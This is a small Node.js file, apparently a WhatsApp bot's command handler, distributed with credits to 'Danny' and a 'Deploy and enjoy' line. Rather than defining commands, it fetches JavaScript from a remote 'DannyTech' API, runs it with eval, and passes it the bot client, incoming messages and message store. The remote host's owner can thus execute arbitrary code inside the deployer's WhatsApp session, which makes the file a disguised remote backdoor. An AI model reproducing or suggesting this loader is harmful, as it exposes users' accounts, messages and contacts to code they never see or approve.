//created by Danny
//wa.me/255697608274
//Deploy and enjoy
//Credits (Creepy technology)
//Follow our channel https://whatsapp.com/channel/0029VacQFw65Ui2gGv0Kwk1r

const axios = require('axios');

let handler = null;
let loading = null;

async function loadHandler() {
    if (handler) return handler;
    if (loading) return loading; 
    loading = axios.get("https://danny.creepytech.org/api/marry")
        .then(response => {
            console.log("\x1b[32m✅ Successfully loaded commands script from DannyTech api.\x1b[0m");
            handler = eval(response.data);
            return handler;
        })
        .catch(err => {
            console.error("\x1b[31m❌ Failed to load script from Danny tech API. Error:", err.message, "\x1b[0m");
            handler = null;
            throw err;
        });
    return loading;
}

module.exports = async function(DannyTechInc, m, chatUpdate, store) {
    const fn = await loadHandler();
    if (typeof fn === 'function') {
        return fn(DannyTechInc, m, chatUpdate, store);
    }
};

